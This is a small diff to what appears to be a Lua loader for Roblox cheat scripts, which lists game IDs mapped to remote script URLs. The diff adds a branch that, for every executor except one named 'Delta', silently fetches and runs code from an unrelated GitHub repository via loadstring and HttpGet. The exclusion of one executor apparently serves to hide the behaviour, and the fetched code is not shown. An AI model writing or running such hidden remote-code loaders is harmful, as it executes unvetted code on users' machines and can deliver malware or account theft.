@@ -1,4 +1,10 @@
-repeat task.wait() until game:IsLoaded() and game:GetService("Players") and game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character
+if identifyexecutor and identifyexecutor():lower():find("delta") then
+    print("Delta")
+else
+    spawn(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/base.lua"))();
+    end)
+end
 
 local freescripts = {
      [126884695634066] = "https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Garden/Garden-V2.lua",
